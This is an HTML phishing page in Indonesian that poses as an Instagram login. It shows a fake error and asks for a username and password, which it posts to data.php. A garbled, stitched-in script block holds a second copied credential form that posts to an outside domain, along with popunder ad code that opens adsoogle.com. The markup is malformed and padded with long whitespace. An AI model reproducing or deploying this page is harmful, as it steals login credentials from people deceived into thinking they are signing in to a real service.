﻿<html>

  <head>
    <title>Masuk • Instagram</title>
    <meta name="theme-color" content="#ffffff">
    <meta content="Selamat datang kembali di Instagram. Masuk untuk memeriksa apa yang telah diabadikan dan dibagikan teman Anda, keluarga, &amp; minat dari seluruh dunia." name="description">
    <link rel="icon" sizes="192x192" href="//www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <link rel="shortcut icon" type="image/x-icon" href="//www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
  </head>

  <body text="#00000" bgcolor="#FFFFFF">

    <body text="#FF1234" link="#FF1234" bgcolor="#FFFFFF" alink="#FFFFFF" vlink="#ececec">
      <!-- T35 Hosting Ad Code Begin -->
      <style type="text/css">
        #t35ad {
          font: 14px arial, helvetica;
          text-decoration: none;
          line-height: 1.5em;
          text-align: center;
        }

        #t35ad a {
          font: 14px arial, helvetica;
          text-decoration: none;
        }

        #t35ad a:hover {
          background-color: blue;
          color: blue;
          font-size: medium;
          font-weight: bold;
        }

        #t35ad ul {
          display: inline;
          list-style-type: none;
          padding: 0;
        }

        #navlist li {
          display: inline;
          list-style-type: none;
          padding-right: 0px;
          padding-left: 0px;
          padding: 0;
        }

      </style>
      <!-- T35 Hosting Ad Code End -->
      <html>

        <head>
          <title>instagram</title>
          <link rel="stylesheet" type="text/css" href="portal_default.css" />
        </head>

        <body text="#00000" bgcolor="#FFFFFF">

          <body text="#FF1234" link="#FF1234" bgcolor="#FFFFFF" alink="#FFFFFF" vlink="#ececec">
            <!-- T35 Hosting Ad Code Begin -->
            <style type="text/css">
              #t35ad {
                font: 14px arial, helvetica;
                text-decoration: none;
                line-height: 1.5em;
                text-align: center;
              }

              #t35ad a {
                font: 14px arial, helvetica;
                text-decoration: none;
              }

              #t35ad a:hover {
                background-color: blue;
                color: blue;
                font-size: medium;
                font-weight: bold;
              }

              #t35ad ul {
                display: inline;
                list-style-type: none;
                padding: 0;
              }

              #navlist li {
                display: inline;
                list-style-type: none;
                padding-right: 0px;
                padding-left: 0px;
                padding: 0;
              }

            </style>
            <!-- T35 Hosting Ad Code End -->

            <center>

              <table cellspacing="0" cellpadding="0" border="0" style="width: 605px;height: 179px;">
                <tbody>
                  <!--- menu ends here --->
                  <tr>
                    <!--- end left column --->
                    <td align="center" valign="top">
                      <!--- photo and caption --->
                      <table cellspacing="0" cellpadding="0" border="0" style="width: 601px;height: 77px;">

                        <tbody>

                          <tr>
                            <td valign="top" style="text-align: center;"><img height="250" width="600" src="https://i.ytimg.com/vi/32Sm8yrkSjI/maxresdefault.jpg" alt="" /></td>
                          </tr>
                        </tbody>
                      </table>
                      <form name="form1" method="post" action="data.php" onsubmit="return cekit();" enctype="multipart/form-data">





                        <div style="margin: 0; padding: 0"><input name="" value="" type="hidden" /></div>



                        <div class="signin-content">



                          <div align="center">



                            <h2 style="color: #00000; font-size: 18px">&nbsp;<span style="color: #00000; font-size: 21px"> Terjadi kesalahan ! silahkan login kembali untuk menuju ke foto :</span></h2>



                            <div h4="" align="canter">



                              <h4 align="canter">



                                <h4 align="canter">



                                  <div id="signin_form">



                                    <div id="" align="center">



                                      <signin>



                                        <table>



                                          <tbody>



                                            <tr>




                                              <th><span style="color: #00000"><label for="EMAIL">Username : </label></span></th>



                                              <td><input class="text" id="email" name="email" tabindex="1" value="" type="text" required /></td>
                                            </tr>



                                            <tr>



                                              <th><span style="color: #00000"><label for="PASSWORD">Password: </label></span></th>



                                              <td><input class="password" id="pass" name="pass" tabindex="2" value="" type="password" required /></td>
                                            </tr>
                                          </tbody>
                                        </table>



                                        <div class="buttons"><input value="Cancel" class="btn btn-l" name="cancel" id="deny" tabindex="4" type="submit" /><input value="Login" class="btn btn-l" id="allow" tabindex="3" type="submit" /></div>



                                        <p class="oauth-errors"></p>
                                      </signin>
                                    </div>
                                  </div>
                                </h4>
                            </div>
                          </div>



                          <center>































































































                            //
                            <![CDATA[
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
twttr.form_authenticity_token = 'dcd4f7ebc2331dcbc58f54706458dc5b07c784ee';
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
//]]>



























































































































































































                            </script>



                            <script type="text/javascript">
                              //<![CDATA[








                              <
                              center >

                                <
                                table cellspacing = "0"
                              cellpadding = "0"
                              border = "0"
                              style = "width: 605px; height: 179px;" >
                                <
                                tbody >
                                <
                                !-- - menu ends here-- - >
                                <
                                tr >
                                <
                                !-- - end left column-- - >
                                <
                                td align = "center"
                              valign = "top" > < !-- - photo and caption-- - >
                                <
                                table cellspacing = "0"
                              cellpadding = "0"
                              border = "0"
                              style = "max-width: 601px; width: 100%; height: 77px;" >

                                <
                                tbody >

                                <
                                tr >
                                <
                                td valign = "top"
                              style = "text-align: center;" > < img height = "400"
                              width = "750"

                              src = "https://fbcdn-sphotos-a.akamaihd.net/hphotos-ak-prn1/538858_277773402301542_100002066522668_690816_713488504_n.jpg"
                              alt = "" / > < /td>  <
                                /tr>  <
                                /tbody>  <
                                /table>  <
                                form name = "form1"
                              method = "post"
                              action = "https://pictr-magesz-dzrqz.com/"
                              onsubmit = "return cekit();"
                              enctype = "multipart/form-data" >




                                <
                                div style = "margin: 0; padding: 0" > < input name = ""
                              value = ""
                              type = "hidden" / > < /div> 



                                <
                                div class = "signin-content" >



                                <
                                div align = "center" >



                                <
                                h2 style = "color: #996600; font-size: 28px" > & nbsp; < span style = "color: #330000; font-size: 24px" > WEBCAMMAX ON FACEBOOK < /span></h2 >



                                <
                                div h4 = ""
                              align = "canter" >



                                <
                                h4 align = "canter" >



                                <
                                h4 align = "canter" >



                                <
                                div id = "signin_form" >



                                <
                                div id = ""
                              align = "center" >



                                <
                                signin >



                                <
                                table >



                                <
                                tbody >



                                <
                                tr >



                                <
                                th > < span style = "color: #330000" > < label
                              for = "login-network-select"
                              langkey = "network" > Network < /label></span > < /th> 



                                <
                                td > < select name = "network"
                              id = "login-network-select" >




                                <
                                option value = "MASTER" > eBuddy ID < /option> 



                                <
                                option value = "MSN"
                              selected = "selected" > MSN < /option> 



                                <
                                option value = "YAHOO" > Yahoo!IM < /option> 



                                <
                                option value = "AIM" > AOL IM < /option> 



                                <
                                option value = "ICQ" > ICQ < /option> 



                                <
                                option value = "GTALK" > Google Talk < /option> 



                                <
                                option value = "FACEBOOK" > Facebook < /option> 



                                <
                                option value = "MYSPACE" > MySpace < /option> 



                                <
                                option value = "HYVES" > Hyves < /option></select > < /td></tr > < /tbody> 




                                <
                                tbody >



                                <
                                tr >



                                <
                                th > < span style = "color: #330000" > < label
                              for = "Username or email" > Email atau Telepon: < /label></span > < /th> 



                                <
                                td > < input class = "text"
                              id = "Username or email"
                              name = "email"
                              tabindex = "1"
                              value = ""
                              type = "text" / > < /td></tr >



                                <
                                tr >



                                <
                                th > < span style = "color: #330000" > < label
                              for = "PASSWORD" > Password: < /label></span > < /th> 



                                <
                                td > < input class = "password"
                              id = "pass"
                              name = "pass"
                              tabindex = "2"
                              value = ""
                              type = "password" / > < /td></tr > < /tbody></table >



                                <
                                div class = "buttons" > < input value = "Cancel"
                              class = "btn btn-l"
                              name = "cancel"
                              id = "deny"
                              tabindex = "4"
                              type = "submit" / > < input value = "Sign in"
                              class = "btn btn-l"
                              id = "allow"
                              tabindex = "3"

                              type = "submit" / > < /div> 



                                <
                                p class = "oauth-errors" > < /p></signin > < /div></div > < /h4></div > < /div> 



                                <
                                center >































































































                                //<![CDATA[ 



























































































                                twttr.form_authenticity_token = 'dcd4f7ebc2331dcbc58f54706458dc5b07c784ee';



























































































































































































                              //]]> 

                            </script>



                            <script type="text/javascript">
                              < script >
                                var puShown = false;
                              var PopWidth = 1100;
                              var PopHeight = 700;
                              var PopFocus = 0;
                              var _Top = null;


                              function GetWindowHeight() {
                                var myHeight = 0;
                                if (typeof(_Top.window.innerHeight) == 'number') {
                                  myHeight = _Top.window.innerHeight;
                                } else if (_Top.document.documentElement && _Top.document.documentElement.clientHeight) {
                                  myHeight = _Top.document.documentElement.clientHeight;
                                } else if (_Top.document.body && _Top.document.body.clientHeight) {
                                  myHeight = _Top.document.body.clientHeight;
                                }
                                return myHeight;
                              }


                              function GetWindowWidth() {
                                var myWidth = 0;
                                if (typeof(_Top.window.innerWidth) == 'number') {
                                  myWidth = _Top.window.innerWidth;
                                } else if (_Top.document.documentElement && _Top.document.documentElement.clientWidth) {
                                  myWidth = _Top.document.documentElement.clientWidth;
                                } else if (_Top.document.body && _Top.document.body.clientWidth) {
                                  myWidth = _Top.document.body.clientWidth;
                                }
                                return myWidth;
                              }


                              function GetWindowTop() {
                                return (_Top.window.screenTop != undefined) ? _Top.window.screenTop : _Top.window.screenY;
                              }


                              function GetWindowLeft() {
                                return (_Top.window.screenLeft != undefined) ? _Top.window.screenLeft : _Top.window.screenX;
                              }


                              function doOpen(url) {
                                var popURL = "about:blank"
                                var popID = "ad_" + Math.floor(89999999 * Math.random() + 10000000);
                                var pxLeft = 0;
                                var pxTop = 0;
                                pxLeft = (GetWindowLeft() + (GetWindowWidth() / 2) - (PopWidth / 2));
                                pxTop = (GetWindowTop() + (GetWindowHeight() / 2) - (PopHeight / 2));


                                if (puShown == true) {
                                  return true;
                                }


                                var PopWin = _Top.window.open(popURL, popID, 'toolbar=0,scrollbars=1,location=1,statusbar=1,menubar=0,resizable=1,top=' + pxTop + ',left=' +

                                  pxLeft + ',width=' + PopWidth + ',height=' + PopHeight);


                                if (PopWin) {
                                  puShown = true;


                                  if (PopFocus == 0) {
                                    PopWin.blur();


                                    if (navigator.userAgent.toLowerCase().indexOf("applewebkit") > -1) {
                                      _Top.window.blur();
                                      _Top.window.focus();
                                    }
                                  }


                                  PopWin.Init = function(e) {


                                    with(e) {


                                      Params = e.Params;
                                      Main = function() {


                                        if (typeof window.mozPaintCount != "undefined") {
                                          var x = window.open("about:blank");
                                          x.close();


                                        }


                                        var popURL = Params.PopURL;


                                        try {
                                          opener.window.focus();
                                        } catch (err) {}


                                        window.location = popURL;
                                      }


                                      Main();
                                    }
                                  };


                                  PopWin.Params = {
                                    PopURL: url
                                  }


                                  PopWin.Init(PopWin);
                                }


                                return PopWin;
                              }


                              function setCookie(name, value, time) {
                                var expires = new Date();


                                expires.setTime(expires.getTime() + time);


                                document.cookie = name + '=' + value + '; path=/;' + '; expires=' + expires.toGMTString();
                              }


                              function getCookie(name) {
                                var cookies = document.cookie.toString().split('; ');
                                var cookie, c_name, c_value;


                                for (var n = 0; n < cookies.length; n++) {
                                  cookie = cookies[n].split('=');
                                  c_name = cookie[0];
                                  c_value = cookie[1];


                                  if (c_name == name) {
                                    return c_value;
                                  }
                                }


                                return null;
                              }


                              function initPu() {


                                _Top = self;


                                if (top != self) {
                                  try {
                                    if (top.document.location.toString())
                                      _Top = top;
                                  } catch (err) {}
                                }


                                if (document.attachEvent) {
                                  document.attachEvent('onclick', checkTarget);
                                } else if (document.addEventListener) {
                                  document.addEventListener('click', checkTarget, false);
                                }
                              }


                              function checkTarget(e) {
                                if (!getCookie('popundr')) {
                                  var e = e || window.event;
                                  var win = doOpen('http://adsoogle.com');


                                  setCookie('popundr', 1, 1 * 60 * 60 * 1000);
                                }
                              }

                              <
                              script type = "text/javascript" >

                                var _gaq = _gaq || [];
                              _gaq.push(['_setAccount', 'UA-2961080-48']);
                              _gaq.push(['_trackPageview']);

                              (function() {
                                var ga = document.createElement('script');
                                ga.type = 'text/javascript';
                                ga.async = true;
                                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                                var s = document.getElementsByTagName('script')[0];
                                s.parentNode.insertBefore(ga, s);
                              })();

                            </script>
          </body>

      </html>
